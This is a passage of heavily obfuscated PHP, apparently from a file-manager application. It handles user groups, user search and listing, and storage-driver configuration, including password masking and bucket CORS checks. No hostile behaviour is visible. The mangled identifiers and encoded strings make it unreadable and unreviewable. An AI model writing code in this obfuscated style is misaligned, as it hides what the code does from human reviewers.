$ίή©¥[2102] => $ΥΧ€ΥΏ); $¥ΘεπΖ[$ίή©¥[2017]] = isset($φ •Ξ―Δ[$Βίΰ¤€†]) ? $φ •Ξ―Δ[$Βίΰ¤€†] : 0; $Βίΰ¤€†++; $ϊ©®ζέ[] = $¥ΘεπΖ; } return $–ƒ‚σΧο->addAll($ϊ©®ζέ, array(), !0); } protected function userGroupAdd($¤ύΗψΆβ, $‘―·ƒΩ = array()) { $ωβΞρ’Ί =& $_SERVER[γγάψ½]; $Αλµ¶Ό… = $this->getInfoSimple($¤ύΗψΆβ); if (!$Αλµ¶Ό… || empty($‘―·ƒΩ)) { return !1; } $ώσΎΑ© = array(); foreach ($‘―·ƒΩ as $΄—ω»θΏ => $ΊΎ¤¦) { $ώσΎΑ©[] = array($ωβΞρ’Ί[1793] => $¤ύΗψΆβ, $ωβΞρ’Ί[1401] => $΄—ω»θΏ, $ωβΞρ’Ί[2102] => $ΊΎ¤¦, $ωβΞρ’Ί[2017] => 0); } return Model($ωβΞρ’Ί[2088])->addAll($ώσΎΑ©, array(), !0); } protected function userGroupRemove($’Η­α¨, $ΧΚδζ²Ί) { $γΕΏΩ =& $_SERVER[γγάψ½]; $ψζό¦µύ = $this->getInfoSimple($’Η­α¨); if (!$ψζό¦µύ || !$ΧΚδζ²Ί) { return !1; } $¤ΓΊοΓά = array($γΕΏΩ[1784] => $’Η­α¨, $γΕΏΩ[2083] => $ΧΚδζ²Ί); return Model($γΕΏΩ[2088])->where($¤ΓΊοΓά)->delete(); } public function listData() { $ΖΦ‡®ό = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ΖΦ‡®ό[$_SERVER[γγάψ½][448]]); return $ΖΦ‡®ό; } public function listByID($υΈΝτ) { $ΧτΕΠξ‰ =& $_SERVER[γγάψ½]; if (!$υΈΝτ) { return; } $Ϋί–Ι•² = array($ΧτΕΠξ‰[1793] => array($ΧτΕΠξ‰[7], $υΈΝτ)); $’ΎψΈε– = $this->where($Ϋί–Ι•²)->select(); $’ΎψΈε– = array_sort_keep($’ΎψΈε–, $ΧτΕΠξ‰[1793], $υΈΝτ); $this->_listDataApply($’ΎψΈε–); return $’ΎψΈε–; } public function listByGroup($‘¦ΓΆΌ― = 0, $Ω²…Ό£ = array()) { $η‹ο•½η =& $_SERVER[γγάψ½]; $²Γγµ = $η‹ο•½η[12]; $Υϋ―Δτ’ = array(); if ($‘¦ΓΆΌ―) { $Υϋ―Δτ’ = array($η‹ο•½η[2526] => intval($‘¦ΓΆΌ―)); $²Γγµ = "\x4c\105\106\x54\x20\112\x4f\x49\x4e\x20{$this->tablePrefix}\x75\163\145\x72\137\147\x72\157\165\160\x20\x75\163\145\x72\x5f\147\162\157\165\x70\40\x6f\156\40\165\x73\145\162\56\x75\163\x65\x72\x49\104\40\x3d\x20\x75\163\145\162\x5f\147\162\157\165\x70\x2e\x75\x73\x65\162\111\104"; $ΌΆάΞψΙ = Input::get($η‹ο•½η[533], null, $η‹ο•½η[12]) ? $η‹ο•½η[12] : $η‹ο•½η[2527]; } if (isset($Ω²…Ό£[$η‹ο•½η[825]])) { $Υϋ―Δτ’[$η‹ο•½η[2528]] = $Ω²…Ό£[$η‹ο•½η[825]]; } $±‘ω­Πύ = _get($Ω²…Ό£, $η‹ο•½η[2529], $η‹ο•½η[234]); if (_get($Ω²…Ό£, $η‹ο•½η[835], !1)) { $Υϋ―Δτ’[$±‘ω­Πύ] = array($η‹ο•½η[2271], $Ω²…Ό£[$η‹ο•½η[835]]); } if (_get($Ω²…Ό£, $η‹ο•½η[836], !1)) { $Βµώ–—Ϊ = array($η‹ο•½η[2272], $Ω²…Ό£[$η‹ο•½η[836]]); if ($Υϋ―Δτ’[$±‘ω­Πύ]) { $Υϋ―Δτ’[$±‘ω­Πύ] = array($Υϋ―Δτ’[$±‘ω­Πύ], $Βµώ–—Ϊ, $η‹ο•½η[2273]); } else { $Υϋ―Δτ’[$±‘ω­Πύ] = $Βµώ–—Ϊ; } } $Ϋ€κή‹ω = $this->_makeOrder($ΌΆάΞψΙ)->field($η‹ο•½η[2530])->where($Υϋ―Δτ’)->join($²Γγµ)->selectPage(50); $this->_listDataApply($Ϋ€κή‹ω[$η‹ο•½η[448]]); return $Ϋ€κή‹ω; } private function _makeOrder($Ύ΄Ψ™ΛΣ = '') { $αΗΑ†Χ =& $_SERVER[γγάψ½]; $±Ψιύ±ο = array($αΗΑ†Χ[1793], $αΗΑ†Χ[32], $αΗΑ†Χ[1982], $αΗΑ†Χ[2201], $αΗΑ†Χ[1954], $αΗΑ†Χ[234]); $Σ£νΦύ’ = array($αΗΑ†Χ[526] => $αΗΑ†Χ[527], $αΗΑ†Χ[528] => $αΗΑ†Χ[529]); $Ω‚Η°—ω = Input::get($αΗΑ†Χ[533], $αΗΑ†Χ[7], $αΗΑ†Χ[1784], $±Ψιύ±ο); $ΖεωώΊμ = Input::get($αΗΑ†Χ[534], $αΗΑ†Χ[7], $αΗΑ†Χ[2089], array($αΗΑ†Χ[2089], $αΗΑ†Χ[528])); $ΖεωώΊμ = $Σ£νΦύ’[$ΖεωώΊμ]; $Ύ΄Ψ™ΛΣ = $Ύ΄Ψ™ΛΣ . "\165\163\145\x72\x2e{$Ω‚Η°—ω}\x20{$ΖεωώΊμ}\x2c\x20\x75\x73\145\x72\56\165\x73\x65\162\111\104\40\141\163\x63"; return $this->alias($αΗΑ†Χ[2217])->order($Ύ΄Ψ™ΛΣ); } public function listSearch($†γοξ) { $σσΔφέ =& $_SERVER[γγάψ½]; $ΧΡτ = trim($†γοξ[$σσΔφέ[2092]]); $Ϊ‚µδφ = explode($σσΔφέ[53], $ΧΡτ); if (!$ΧΡτ || count($Ϊ‚µδφ) == 1) { return $this->listSearchNow($†γοξ); } $Π°ξ€© = array($σσΔφέ[448] => array()); foreach ($Ϊ‚µδφ as $ΨΑƒ¤Κ) { if (!trim($ΨΑƒ¤Κ)) { continue; } $†γοξ[$σσΔφέ[2092]] = $ΨΑƒ¤Κ; $®Φ•ΐ’™ = $this->listSearchNow($†γοξ); $Π°ξ€©[$σσΔφέ[448]] = array_merge($Π°ξ€©[$σσΔφέ[448]], $®Φ•ΐ’™[$σσΔφέ[448]]); } $Π°ξ€©[$σσΔφέ[448]] = array_unique_by_key($Π°ξ€©[$σσΔφέ[448]], $σσΔφέ[1793]); $Π°ξ€©[$σσΔφέ[445]] = array($σσΔφέ[446] => count($Π°ξ€©[$σσΔφέ[448]]), $σσΔφέ[442] => 20, $σσΔφέ[431] => 1, $σσΔφέ[447] => 1); return $Π°ξ€©; } public function listSearchNow($ϋ°ϋλΜ) { $ϋΤ«Ω© =& $_SERVER[γγάψ½]; $ζ†³³›ώ = trim($ϋ°ϋλΜ[$ϋΤ«Ω©[2092]]); $Ίξσ¦•ί = isset($ϋ°ϋλΜ[$ϋΤ«Ω©[2093]]) ? $ϋ°ϋλΜ[$ϋΤ«Ω©[2093]] : !1; $ζ†³³›ώ = str_replace($ϋΤ«Ω©[2094], $ϋΤ«Ω©[2095], trim($ζ†³³›ώ)); $€›“ϋΚΤ = array($ϋΤ«Ω©[32] => array($ϋΤ«Ω©[462], "\x25{$ζ†³³›ώ}\45"), $ϋΤ«Ω©[383] => array($ϋΤ«Ω©[462], "{$ζ†³³›ώ}\x25"), $ϋΤ«Ω©[2290] => array($ϋΤ«Ω©[462], "{$ζ†³³›ώ}\45"), $ϋΤ«Ω©[1086] => $ϋΤ«Ω©[2096]); if (Input::check($ζ†³³›ώ, $ϋΤ«Ω©[389])) { $€›“ϋΚΤ[$ϋΤ«Ω©[1793]] = array($ϋΤ«Ω©[462], "{$ζ†³³›ώ}\x25"); $€›“ϋΚΤ[$ϋΤ«Ω©[2510]] = array($ϋΤ«Ω©[462], "{$ζ†³³›ώ}\45"); } if (!$ζ†³³›ώ) { $€›“ϋΚΤ = array(); } if (isset($ϋ°ϋλΜ[$ϋΤ«Ω©[825]])) { $€›“ϋΚΤ[$ϋΤ«Ω©[825]] = $ϋ°ϋλΜ[$ϋΤ«Ω©[825]]; } $€›“ϋΚΤ = $this->parseWhereLike($€›“ϋΚΤ); $³²’¦ = $this->_makeOrder()->where($€›“ϋΚΤ)->selectPage(20); if (!$³²’¦ || count($³²’¦[$ϋΤ«Ω©[448]]) < 5 && Input::check($ζ†³³›ώ, $ϋΤ«Ω©[396])) { $ΛίμΟπ = $this->_searchFromMeta($ϋΤ«Ω©[540], $ζ†³³›ώ, 10); $•ν‹ΰύ = $this->_searchFromMeta($ϋΤ«Ω©[541], $ζ†³³›ώ, 10); $Η™£“ψ = array_merge($ΛίμΟπ, $•ν‹ΰύ, $³²’¦[$ϋΤ«Ω©[448]]); $³²’¦[$ϋΤ«Ω©[448]] = array_unique_by_key($Η™£“ψ, $ϋΤ«Ω©[1793]); $³²’¦[$ϋΤ«Ω©[445]][$ϋΤ«Ω©[446]] = count($³²’¦[$ϋΤ«Ω©[448]]); $³²’¦[$ϋΤ«Ω©[445]][$ϋΤ«Ω©[447]] = ceil($³²’¦[$ϋΤ«Ω©[445]][$ϋΤ«Ω©[446]] / $³²’¦[$ϋΤ«Ω©[445]][$ϋΤ«Ω©[442]]); } $this->_listDataApply($³²’¦[$ϋΤ«Ω©[448]]); $this->_filterByGroup($³²’¦, $Ίξσ¦•ί); return $³²’¦; } private function _filterByGroup(&$α©­Θ, $ίϊςλ¶) { $£¬ήΦΧ³ =& $_SERVER[γγάψ½]; if (!$ίϊςλ¶) { return $α©­Θ; } foreach ($α©­Θ[$£¬ήΦΧ³[448]] as $―·ϋΊΩ® => &$έΆ©ρω•) { $‘•‹Κ = array_to_keyvalue($έΆ©ρω•[$£¬ήΦΧ³[1400]], $£¬ήΦΧ³[12], $£¬ήΦΧ³[1401]); if (!in_array($ίϊςλ¶, $‘•‹Κ)) { unset($α©­Θ[$£¬ήΦΧ³[448]][$―·ϋΊΩ®]); } } unset($έΆ©ρω•); $α©­Θ[$£¬ήΦΧ³[448]] = array_values($α©­Θ[$£¬ήΦΧ³[448]]); $α©­Θ[$£¬ήΦΧ³[445]] = array($£¬ήΦΧ³[2254] => count($α©­Θ[$£¬ήΦΧ³[448]]), $£¬ήΦΧ³[2252] => $α©­Θ[$£¬ήΦΧ³[445]][$£¬ήΦΧ³[442]], $£¬ήΦΧ³[2251] => 1, $£¬ήΦΧ³[2253] => 1); } private function _searchFromMeta($–²ώ­—, $Ιβ„ΥΗ©, $ Ύ“ψέθ) { $ΘΜΪω°ν =& $_SERVER[γγάψ½]; $Ιβ„ΥΗ© = strtolower($Ιβ„ΥΗ©); $ο΅Α = array($ΘΜΪω°ν[97] => $–²ώ­—, $ΘΜΪω°ν[453] => array($ΘΜΪω°ν[462], "\45{$Ιβ„ΥΗ©}\45")); $ο΅Α = $this->parseWhereLike($ο΅Α); $ώ©»Κ† = Model($ΘΜΪω°ν[2531])->where($ο΅Α)->limit($ Ύ“ψέθ)->select(); if (!$ώ©»Κ†) { return array(); } $ώ©»Κ† = array_to_keyvalue($ώ©»Κ†, $ΘΜΪω°ν[12], $ΘΜΪω°ν[1793]); $„«£—µΆ = $this->where(array($ΘΜΪω°ν[1784] => array($ΘΜΪω°ν[7], $ώ©»Κ†)))->select(); if (!$„«£—µΆ) { return array(); } return $„«£—µΆ; } private function _listDataApplyItem($·µ‡ηοζ) { $ΉάέύΰΩ = array($·µ‡ηοζ); $this->_listDataApply($ΉάέύΰΩ); return $ΉάέύΰΩ[0]; } private function _listDataApply(&$ΝυΦ‰ή) { $«ΜΕ‡φ =& $_SERVER[γγάψ½]; if (!$ΝυΦ‰ή) { return; } array_remove_key($ΝυΦ‰ή, $«ΜΕ‡φ[975]); $Ξαο«Ο = array_to_keyvalue($ΝυΦ‰ή, $«ΜΕ‡φ[12], $«ΜΕ‡φ[1793]); $this->_listAppendGroup($ΝυΦ‰ή, $Ξαο«Ο); $this->_listAppendMeta($ΝυΦ‰ή, $Ξαο«Ο); $this->_listAppendSourceRoot($ΝυΦ‰ή, $Ξαο«Ο); } private function _listAppendSourceRoot(&$£¶Εό‹μ, $ϋζ›‚Ν) { $Ά Β• =& $_SERVER[γγάψ½]; $”›Ϊνϋ£ = Model($Ά Β•[905])->listSourceRoot(SourceModel::TYPE_USER, $ϋζ›‚Ν); $”›Ϊνϋ£ = array_to_keyvalue($”›Ϊνϋ£, $Ά Β•[574]); $”›Ϊνϋ£ = array_remove_key($”›Ϊνϋ£, $Ά Β•[574]); foreach ($£¶Εό‹μ as &$³‹ΔΏ) { $³‹ΔΏ[$Ά Β•[90]] = $”›Ϊνϋ£[$³‹ΔΏ[$Ά Β•[1793]]] ? $”›Ϊνϋ£[$³‹ΔΏ[$Ά Β•[1793]]] : array(); } unset($³‹ΔΏ); } private function _listAppendGroup(&$ Ίωςγ, $Ζ£™­›) { $‹™ΝΐΛί =& $_SERVER[γγάψ½]; $Δ¤ώ¨«τ = array($‹™ΝΐΛί[1793] => array($‹™ΝΐΛί[7], $Ζ£™­›)); $½€ΰΝ°ο = Model($‹™ΝΐΛί[2088])->where($Δ¤ώ¨«τ)->select(); $¦κΕΰ = array_to_keyvalue($½€ΰΝ°ο, $‹™ΝΐΛί[12], $‹™ΝΐΛί[1401]); $¦κΕΰ = array_remove_value(array_unique($¦κΕΰ), $‹™ΝΐΛί[231]); if (!$¦κΕΰ || !$½€ΰΝ°ο) { return; } $Δ¤ώ¨«τ = array($‹™ΝΐΛί[1401] => array($‹™ΝΐΛί[7], $¦κΕΰ)); $€ξΥϊ = Model($‹™ΝΐΛί[1399])->field($‹™ΝΐΛί[2532])->where($Δ¤ώ¨«τ)->select(); $€ξΥϊ = array_to_keyvalue($€ξΥϊ, $‹™ΝΐΛί[1401]); $½€ΰΝ°ο = array_to_keyvalue_group($½€ΰΝ°ο, $‹™ΝΐΛί[1793]); foreach ($½€ΰΝ°ο as &$ΊΡ‘ύκΐ) { $¨ύκί»Λ = array(); foreach ($ΊΡ‘ύκΐ as $δόΊΠ†ί) { if (!$δόΊΠ†ί[$‹™ΝΐΛί[2102]]) { continue; } $πΣϊωΠ = Model($‹™ΝΐΛί[576])->listData($δόΊΠ†ί[$‹™ΝΐΛί[2102]]); $¨ύκί»Λ[] = array($‹™ΝΐΛί[1401] => $δόΊΠ†ί[$‹™ΝΐΛί[1401]], $‹™ΝΐΛί[2533] => $€ξΥϊ[$δόΊΠ†ί[$‹™ΝΐΛί[1401]]][$‹™ΝΐΛί[32]], $‹™ΝΐΛί[589] => $€ξΥϊ[$δόΊΠ†ί[$‹™ΝΐΛί[1401]]][$‹™ΝΐΛί[589]], $‹™ΝΐΛί[490] => $πΣϊωΠ); } $ΊΡ‘ύκΐ = $¨ύκί»Λ; } unset($ΊΡ‘ύκΐ); foreach ($ Ίωςγ as &$θ«Ψ®“α) { $θ«Ψ®“α[$‹™ΝΐΛί[1400]] = array(); if (isset($½€ΰΝ°ο[$θ«Ψ®“α[$‹™ΝΐΛί[1793]]])) { $θ«Ψ®“α[$‹™ΝΐΛί[1400]] = $½€ΰΝ°ο[$θ«Ψ®“α[$‹™ΝΐΛί[1793]]]; } } unset($θ«Ψ®“α); } public function userAppendGroup($Τ“•‹Δ) { $’—“Μβ =& $_SERVER[γγάψ½]; if (!$Τ“•‹Δ) { return array(); } $this->_listAppendGroup($Τ“•‹Δ, array_to_keyvalue($Τ“•‹Δ, $’—“Μβ[12], $’—“Μβ[1793])); return $Τ“•‹Δ; } private function _listAppendMeta(&$‹ΠΕ»ί°, $ρ«Γυ) { $γ£ξΰβ =& $_SERVER[γγάψ½]; $›ο±‘Ύ = UserJobModel::JOB_KEY; $Έΰ§Χφ = array($γ£ξΰβ[2086]); $ώέ²φ¬ = array($γ£ξΰβ[1793] => array($γ£ξΰβ[7], $ρ«Γυ)); $υ΄ΝΆΏλ = Model($γ£ξΰβ[2509])->where($ώέ²φ¬)->select(); $ΜΙ¦Δ± = array(); foreach ($υ΄ΝΆΏλ as $ξθΠ’δΈ) { $Ηϊµώνβ = $ξθΠ’δΈ[$γ£ξΰβ[1793]]; if (!isset($ΜΙ¦Δ±[$Ηϊµώνβ])) { $ΜΙ¦Δ±[$Ηϊµώνβ] = array(); } $ΜΙ¦Δ±[$Ηϊµώνβ][$ξθΠ’δΈ[$γ£ξΰβ[97]]] = $ξθΠ’δΈ[$γ£ξΰβ[453]]; } $ΊΨ΅Έό = Model($γ£ξΰβ[2534]); foreach ($‹ΠΕ»ί° as &$«ΨΌμ) { $Ηϊµώνβ = $«ΨΌμ[$γ£ξΰβ[1793]]; $πΝΆρέζ = isset($ΜΙ¦Δ±[$Ηϊµώνβ]) ? $ΜΙ¦Δ±[$Ηϊµώνβ] : array(); $«ΨΌμ[$γ£ξΰβ[544]] = array_field_key($πΝΆρέζ, $Έΰ§Χφ); $«ΨΌμ[$γ£ξΰβ[2535]] = array(); if (isset($πΝΆρέζ[$›ο±‘Ύ])) { $«ΨΌμ[$γ£ξΰβ[2535]] = $ΊΨ΅Έό->getUserJobInfo($πΝΆρέζ[$›ο±‘Ύ]); } } unset($«ΨΌμ); } protected function groupUserAll($ΠκδΏ²ά) { $ΊΝ™ύΥ =& $_SERVER[γγάψ½]; if (!$ΠκδΏ²ά) { return !1; } $ΣΣν = Model($ΊΝ™ύΥ[2088])->field($ΊΝ™ύΥ[1793])->where(array($ΊΝ™ύΥ[1401] => array($ΊΝ™ύΥ[7], $ΠκδΏ²ά)))->select(); $ΣΣν = array_to_keyvalue($ΣΣν, $ΊΝ™ύΥ[12], $ΊΝ™ύΥ[1793]); return array_unique($ΣΣν); } public function userSearch($ωλµ‡β, $ηέΣΤΝ = "\x2a") { return Model($_SERVER[γγάψ½][602])->where($ωλµ‡β)->field($ηέΣΤΝ)->find(); } } goto e‰¤‚γίω; BΜΐίω…Όέ: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\56\x73\x6f\165\x72\143\x65\x53\145\143\x72\x65\x74\114\x69\163\x74"; public $field = array("\x73\x6f\165\x72\143\145\111\104", "\x74\x79\160\145\x49\104", "\x63\162\x65\141\164\145\x55\163\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\x2e\x73\x74\x6f\162\141\147\145\114\x69\163\x74"; public $field = array("\x6e\141\155\145", "\x73\151\x7a\x65\x4d\141\170", "\163\171\x73\x74\145\155", "\x64\145\146\141\165\154\x74", "\x64\x72\x69\x76\145\x72", "\143\x6f\x6e\146\151\147"); public function listData($Ψί”»„ = false, $Ν·Ρ”Αά = "\155\157\144\x69\x66\171\x54\151\155\x65", $σΈ“ώό = false) { $ΜξΣΌΜ =& $_SERVER[γγάψ½]; $΅ΠΤϊα = parent::listData($Ψί”»„, $Ν·Ρ”Αά, $σΈ“ώό); if ($Ψί”»„) { return $΅ΠΤϊα; } $―΄“ω = array(); if ($GLOBALS[$ΜξΣΌΜ[2328]]) { $―΄“ω = $this->ioSizeUseGet(array_to_keyvalue($΅ΠΤϊα, $ΜξΣΌΜ[12], $ΜξΣΌΜ[478])); } foreach ($΅ΠΤϊα as $”Κ—ΪΦ => $”Ϊ‡”•) { unset($΅ΠΤϊα[$”Κ—ΪΦ][$ΜξΣΌΜ[6]]); $΅ΠΤϊα[$”Κ—ΪΦ][$ΜξΣΌΜ[1982]] = isset($―΄“ω[$”Ϊ‡”•[$ΜξΣΌΜ[478]]]) ? $―΄“ω[$”Ϊ‡”•[$ΜξΣΌΜ[478]]] : 0; } return $΅ΠΤϊα; } public function ioSizeUseGet($‡¨ΰ¦µ) { $Χ¥Ξη¥ =& $_SERVER[γγάψ½]; if (!$‡¨ΰ¦µ) { return array(); } $Ι€‘§£ = $Χ¥Ξη¥[2329] . implode($Χ¥Ξη¥[50], $‡¨ΰ¦µ); $ƒό»ψ•δ = Cache::get($Ι€‘§£); if ($ƒό»ψ•δ) { return $ƒό»ψ•δ; } $ϊϋ¶Άΰ = array($Χ¥Ξη¥[898] => $Χ¥Ξη¥[478], $Χ¥Ξη¥[2330] => $Χ¥Ξη¥[79]); $£Ρξα = array($Χ¥Ξη¥[898] => array($Χ¥Ξη¥[7], $‡¨ΰ¦µ)); $ƒό»ψ•δ = Model($Χ¥Ξη¥[866])->field($ϊϋ¶Άΰ)->where($£Ρξα)->group($Χ¥Ξη¥[898])->select(); $ƒό»ψ•δ = array_to_keyvalue($ƒό»ψ•δ, $Χ¥Ξη¥[478], $Χ¥Ξη¥[79]); Cache::set($Ι€‘§£, $ƒό»ψ•δ, 600); return $ƒό»ψ•δ; } public function getConfig($―§Δ£έβ) { $· ΒΤί = parent::listData($―§Δ£έβ); $ΠίΚΤ = _get($· ΒΤί, $_SERVER[γγάψ½][6], array()); if ($ΠίΚΤ && !is_array($ΠίΚΤ)) { $ΠίΚΤ = json_decode($ΠίΚΤ, !0); } return $ΠίΚΤ; } public function update($βνρΡβ™, $ΔΉςτλΖ) { $ζΫ―ϋΫ™ =& $_SERVER[γγάψ½]; $³²σ‚¶ = $ΔΉςτλΖ[$ζΫ―ϋΫ™[32]]; $Ε‰—Α = array_to_keyvalue(parent::listData(), $ζΫ―ϋΫ™[32]); if (isset($Ε‰—Α[$³²σ‚¶]) && $Ε‰—Α[$³²σ‚¶][$ζΫ―ϋΫ™[478]] != $βνρΡβ™) { return !1; } $this->checkPwd($βνρΡβ™, $ΔΉςτλΖ); if (isset($ΔΉςτλΖ[$ζΫ―ϋΫ™[2331]]) && $ΔΉςτλΖ[$ζΫ―ϋΫ™[2331]] == $ζΫ―ϋΫ™[91]) { $this->checkConfig($ΔΉςτλΖ); } unset($ΔΉςτλΖ[$ζΫ―ϋΫ™[2331]]); $ςΌΌ‰ς = parent::update($βνρΡβ™, $ΔΉςτλΖ); if ($ςΌΌ‰ς && $ΔΉςτλΖ[$ζΫ―ϋΫ™[37]]) { foreach ($Ε‰—Α as $΅ΦΠμ–•) { if ($΅ΦΠμ–•[$ζΫ―ϋΫ™[37]] && $΅ΦΠμ–•[$ζΫ―ϋΫ™[478]] != $βνρΡβ™) { parent::update($΅ΦΠμ–•[$ζΫ―ϋΫ™[478]], array($ζΫ―ϋΫ™[37] => 0)); } } $this->updateBackup($βνρΡβ™, $Ε‰—Α); } return $ςΌΌ‰ς; } public function add($¤ΘΗΜ‹³) { $ ό½ή =& $_SERVER[γγάψ½]; $ΛΤƒΎί = array_to_keyvalue(parent::listData(), $ ό½ή[32]); if (isset($ΛΤƒΎί[$¤ΘΗΜ‹³[$ ό½ή[32]]])) { return !1; } $this->checkConfig($¤ΘΗΜ‹³); $¶‘ΛΥί§ = parent::insert($¤ΘΗΜ‹³); if ($¶‘ΛΥί§ && $¤ΘΗΜ‹³[$ ό½ή[37]]) { foreach ($ΛΤƒΎί as $¶ν·Ό¤) { if ($¶ν·Ό¤[$ ό½ή[37]]) { parent::update($¶ν·Ό¤[$ ό½ή[478]], array($ ό½ή[37] => 0)); } } $this->updateBackup($¶‘ΛΥί§, $ΛΤƒΎί); } return $¶‘ΛΥί§; } public function updateBackup($³γΫ΅ήγ, $ι €ή¶) { $παΆυδ =& $_SERVER[γγάψ½]; if ($³γΫ΅ήγ == $παΆυδ[91]) { return; } $Ϊ£φδί = Model($παΆυδ[823])->config(); $£»σδ΅­ = $Ϊ£φδί[$παΆυδ[827]]; if ($Ϊ£φδί[$παΆυδ[1762]] != $παΆυδ[91] || $£»σδ΅­ == $³γΫ΅ήγ) { return; } if ($£»σδ΅­ != $παΆυδ[91]) { $Υ‘ƒε¤ = array(); foreach ($ι €ή¶ as $πη‹€ΉΪ) { if ($³γΫ΅ήγ == $πη‹€ΉΪ[$παΆυδ[478]]) { continue; } $Υ‘ƒε¤[] = $πη‹€ΉΪ[$παΆυδ[478]]; } if ($Υ‘ƒε¤ && in_array($£»σδ΅­, $Υ‘ƒε¤)) { return; } } $ΦΪ©›γε = Model($παΆυδ[845])->get($παΆυδ[852]); $ΦΪ©›γε = json_decode($ΦΪ©›γε, !0); if (!$ΦΪ©›γε) { return; } $ΦΪ©›γε[$παΆυδ[827]] = $³γΫ΅ήγ; Model($παΆυδ[845])->set(array($παΆυδ[852] => $ΦΪ©›γε)); } public function checkPwd($™€ΟΛΣφ, &$ΒυγΆ ΰ) { $¬Σάγ =& $_SERVER[γγάψ½]; if (empty($ΒυγΆ ΰ[$¬Σάγ[6]])) { return; } $®¨‹κ = $ΒυγΆ ΰ[$¬Σάγ[6]]; if (!is_array($®¨‹κ)) { $®¨‹κ = json_decode($®¨‹κ, !0); } $πΩσ³ = $¬Σάγ[12]; $ ¶σ½χƒ = array($¬Σάγ[2332], $¬Σάγ[2333], $¬Σάγ[975]); foreach ($ ¶σ½χƒ as $ ΰκτ) { if (isset($®¨‹κ[$ ΰκτ])) { $πΩσ³ = $ ΰκτ; break; } } if (!$πΩσ³) { return; } $θ”‚ΜΎ = $this->getConfig($™€ΟΛΣφ); $Γ©ώΆ¶™ = $θ”‚ΜΎ[$πΩσ³]; $ο‚ηώ¤Ί = $®¨‹κ[$πΩσ³]; if ($ο‚ηώ¤Ί == str_repeat($¬Σάγ[223], strlen($Γ©ώΆ¶™))) { $®¨‹κ[$πΩσ³] = $Γ©ώΆ¶™; $ΒυγΆ ΰ[$¬Σάγ[6]] = json_encode($®¨‹κ); } else { if ($ο‚ηώ¤Ί != $Γ©ώΆ¶™) { $ΒυγΆ ΰ[$¬Σάγ[2331]] = $¬Σάγ[91]; } } } public function checkConfig(&$¤ΈΡΏΘ², $ψΓ­΄„£ = false) { $ρ§¬³Ι =& $_SERVER[γγάψ½]; $ΦίμΕύΐ = strtolower($¤ΈΡΏΘ²[$ρ§¬³Ι[98]]); $Νάώρ΄ = $¤ΈΡΏΘ²[$ρ§¬³Ι[6]]; if (!is_array($Νάώρ΄)) { $Νάώρ΄ = json_decode($Νάώρ΄, !0); } foreach ($Νάώρ΄ as $ΤΖύ’½ => $ΦΌΏΓΞ) { if (is_string($ΦΌΏΓΞ)) { $Νάώρ΄[$ΤΖύ’½] = trim($ΦΌΏΓΞ); } } $Νάώρ΄[$ρ§¬³Ι[2334]] = rand_string(6); $έΠΉ³¶° = $GLOBALS[$ρ§¬³Ι[6]][$ρ§¬³Ι[92]][$ρ§¬³Ι[906]]; $πορ‹ = isset($έΠΉ³¶°[$ΦίμΕύΐ]) ? $έΠΉ³¶°[$ΦίμΕύΐ] : ucfirst($ΦίμΕύΐ); $γ΄­‹’ά = $ρ§¬³Ι[77] . $πορ‹; if (!$πορ‹ || !class_exists($γ΄­‹’ά)) { if ($ψΓ­΄„£) { return LNG($ρ§¬³Ι[2335]); } write_log(array($ρ§¬³Ι[2336], $¤ΈΡΏΘ², get_caller_info()), $ρ§¬³Ι[216]); show_json(LNG($ρ§¬³Ι[2335]), !1, $¤ΈΡΏΘ²); } $ΛδΓιΓί = new $γ΄­‹’ά($Νάώρ΄); $ΩξΎχ = rtrim($Νάώρ΄[$ρ§¬³Ι[1273]], $ρ§¬³Ι[8]) . $ρ§¬³Ι[8]; if (in_array($ΦίμΕύΐ, $ΛδΓιΓί->objectDriver)) { try { if (!$ΛδΓιΓί->isBucketCors() && !$ΛδΓιΓί->setBucketCors()) { $Ίτ– ώ = LNG($ρ§¬³Ι[2337]); $Ίτ– ώ .= $ρ§¬³Ι[2338] . LNG($ρ§¬³Ι[2339]); } } catch (Exception $φ‡ΆχΙ—) { $Ίτ– ώ = $φ‡ΆχΙ—->getMessage(); } if (isset($Ίτ– ώ)) { return $this->_parseError($Ίτ– ώ, $ΦίμΕύΐ, $ψΓ­΄„£); } if ($ΦίμΕύΐ == $ρ§¬³Ι[68] && !$ΛδΓιΓί->checkRegion()) { return $this->_parseError(LNG($ρ§¬³Ι[2340]), $ΦίμΕύΐ, $ψΓ­΄„£); } } else { if ($ΦίμΕύΐ == $ρ§¬³Ι[2341]) { if ($ΛδΓιΓί->ftpPath) { $’…«Φϊ = trim($ΩξΎχ, $ρ§¬³Ι[8]); if (stripos($’…«Φϊ, trim($ΛδΓιΓί->ftpPath, $ρ§¬³Ι[8])) !== 0) { $ΩξΎχ = $ΛδΓιΓί->ftpPath . $ρ§¬³Ι[8] . ($’…«Φϊ ? $’…«Φϊ . $ρ§¬³Ι[8] : $ρ§¬³Ι[12]); } } } } $δ¥¦»ΰΆ = $ΛδΓιΓί->getPath($ΩξΎχ . $ρ§¬³Ι[1277]); try { if ($ΦίμΕύΐ == $ρ§¬³Ι[109]) { $ΛδΓιΓί->mkdir($ΩξΎχ); } $Γω±νΕε = $ΛδΓιΓί->mkfile($δ¥¦»ΰΆ); if (!$Γω±νΕε) { $Ίτ– ώ = LNG($ρ§¬³Ι[2337]); } } catch (Exception $φ‡ΆχΙ—) { $Ίτ– ώ = $φ‡ΆχΙ—->getMessage(); } if (isset($Ίτ– ώ)) { return $this->_parseError($Ίτ– ώ, $ΦίμΕύΐ, $ψΓ­΄„£); } $Νάώρ΄[$ρ§¬³Ι[1273]] = $ΩξΎχ; $¤ΈΡΏΘ²[$ρ§¬³Ι[6]] = json_encode($Νάώρ΄); $¤ΈΡΏΘ²[$ρ§¬³Ι[98]] = $πορ‹; return !0; } private function _parseError($ξ³Λϋ…, $›όƒ¤η’, $ήυιΘ = false) { $Ψ»Ο•¤ =& $_SERVER[γγάψ½]; if ($›όƒ¤η’ == $Ψ»Ο•¤[68] && stripos($ξ³Λϋ…, $Ψ»Ο•¤[2342])) { $»ΐαΒί΄ = explode($Ψ»Ο•¤[10], $ξ³Λϋ…); $σθςβ‘ = isset($»ΐαΒί΄[1]) ? $»ΐαΒί΄[1] : $Ψ»Ο•¤[12]; $¦‚ΠΝ ¦ = array($Ψ»Ο•¤[2343] => LNG($Ψ»Ο•¤[2344]), $Ψ»Ο•¤[2345] => 